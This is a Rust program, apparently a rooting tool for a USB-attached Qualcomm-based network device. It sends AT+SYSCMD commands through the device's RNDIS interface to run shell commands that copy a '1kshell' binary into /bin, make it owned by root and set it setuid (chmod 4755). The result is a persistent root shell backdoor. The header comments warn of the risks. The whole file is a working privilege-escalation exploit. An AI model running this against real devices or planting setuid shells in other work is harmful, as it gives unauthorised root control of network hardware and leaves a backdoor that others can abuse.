//! Send AT commands to move 1kshell to /bin/ and set the permissions to (4755) setuid, owner rwx, group and others rx
//!
//! Use this program at your own risk!!
//! It's generally not a good idea to send random USB control messages down the wire using a random program you found on the internet!
//! It's also probably not a good idea to leave setuid binaries sitting around on your network hardware.
//!
//! If this was successful, a copy of 1kshell with setuid and execute permissions will now live in /bin/ (alongside the original in /tmp/)
//! You should probably delete both of these files when you're done

use nusb::transfer::{Buffer, Bulk, ControlOut, ControlType, In, Out, Recipient, TransferError};
use nusb::{Endpoint, Interface, MaybeFuture};
use std::io;
use std::thread::sleep;
use std::time::Duration;

const VENDOR_ID: u16 = 0x05c6;
const PRODUCT_ID: u16 = 0xf601;

const RNDIS_INTERFACE: u8 = 1;

fn send_usb_class_control_msg(
    interface: &Interface,
    request: u8,
    value: u16,
    index: u16,
    data: &[u8],
    timeout: Duration,
) -> Result<(), TransferError> {
    let control: ControlOut<'_> = ControlOut {
        control_type: ControlType::Class,
        recipient: Recipient::Interface,
        request,
        value,
        index,
        data,
    };

    interface.control_out(control, timeout).wait()
}

fn usb_bulk_write(
    interface: &Interface,
    endpoint_address: u8,
    data: Vec<u8>,
    timeout: Duration,
) -> Result<Buffer, io::Error> {
    let mut endpoint: Endpoint<Bulk, Out> = interface.endpoint(endpoint_address)?;
    Ok(endpoint
        .transfer_blocking(data.into(), timeout)
        .into_result()?)
}

fn usb_bulk_read(
    interface: &Interface,
    endpoint_address: u8,
    len: usize,
    timeout: Duration,
) -> Result<Buffer, io::Error> {
    let mut endpoint: Endpoint<Bulk, In> = interface.endpoint(endpoint_address)?;
    let response_buf = Buffer::new(len);
    Ok(endpoint
        .transfer_blocking(response_buf, timeout)
        .into_result()?)
}

fn send_command(
    interface: &Interface,
    command: &str,
    timeout: Duration,
) -> Result<[Buffer; 3], io::Error> {
    let mut data = String::new();
    data.push_str("\r\n");
    data.push_str(command);
    data.push_str("\r\n");

    send_usb_class_control_msg(&interface, 0x22, 3, 1, &[], timeout)?;

    // Send the command
    let wrote = usb_bulk_write(&interface, 0x2, data.into(), timeout)?;
    // Consume the echoed command
    let echo = usb_bulk_read(&interface, 0x82, 256 * 32, timeout)?;
    // Read response
    let resp = usb_bulk_read(&interface, 0x82, 256 * 32, timeout)?;
    Ok([wrote, echo, resp])
}

fn parse_bufs(bufs: [Buffer; 3]) -> String {
    let strs = bufs.map(|buf| String::from_utf8(buf.to_vec()).unwrap());
    format!(
        "Sent command: {}\nEcho: {}\nResponse: {}",
        strs[0], strs[1], strs[2]
    )
}

fn main() -> Result<(), io::Error> {
    let timeout = Duration::from_secs(2);
    let device = nusb::list_devices()
        .wait()?
        .find(|d| d.vendor_id() == VENDOR_ID && d.product_id() == PRODUCT_ID)
        .ok_or(io::Error::new(io::ErrorKind::NotFound, "Device not found!"))?
        .open()
        .wait()?;
    let interface = device.detach_and_claim_interface(RNDIS_INTERFACE).wait()?;

    let c1 = send_command(&interface, "AT+SYSCMD=cp /tmp/1kshell /bin/", timeout)?;
    println!("{}", parse_bufs(c1));
    sleep(Duration::from_secs(2));
    let c2 = send_command(&interface, "AT+SYSCMD=chown root /bin/1kshell", timeout)?;
    println!("{}", parse_bufs(c2));
    sleep(Duration::from_secs(2));
    let c3 = send_command(&interface, "AT+SYSCMD=chmod 4755 /bin/1kshell", timeout)?;
    println!("{}", parse_bufs(c3));
    sleep(Duration::from_secs(2));
    Ok(())
}
